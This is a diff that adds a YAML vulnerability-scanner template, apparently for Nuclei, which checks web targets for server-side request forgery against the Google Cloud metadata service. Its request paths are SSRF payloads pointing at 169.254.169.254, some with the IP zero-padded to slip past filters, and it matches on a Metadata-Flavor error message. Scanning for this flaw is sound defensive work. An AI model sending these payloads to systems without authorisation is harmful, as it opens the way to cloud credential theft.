@@ -1,0 +1,27 @@
+id: gcp-possible-ssrf
+
+info:
+  name: GCP Detect SSRF
+  author: reewardius
+  reference: https://infosecwriteups.com/story-of-a-1k-bounty-ssrf-d5c4868680f5
+  severity: high
+  tags: ssrf,generic
+  metadata:
+    max-request: 3
+    
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/computeMetadata/v1/?__host=169.254.169.254&__proto=http"
+      - "{{BaseURL}}/computeMetadata/v1/?__host=169.254.169.254&__proto=https"
+      - "{{BaseURL}}/computeMetadata/v1/?_host=169.254.169.254&_proto=http"
+      - "{{BaseURL}}/computeMetadata/v1/?__host=000169.000254.000169.000254&__proto=http"
+      - "{{BaseURL}}/computeMetadata/v1/?__host=000169.000254.000169.000254&__proto=https"
+      - "{{BaseURL}}/computeMetadata/v1/?_host=000169.000254.000169.000254&_proto=http"
+      
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Missing required header: Metadata-Flavor"
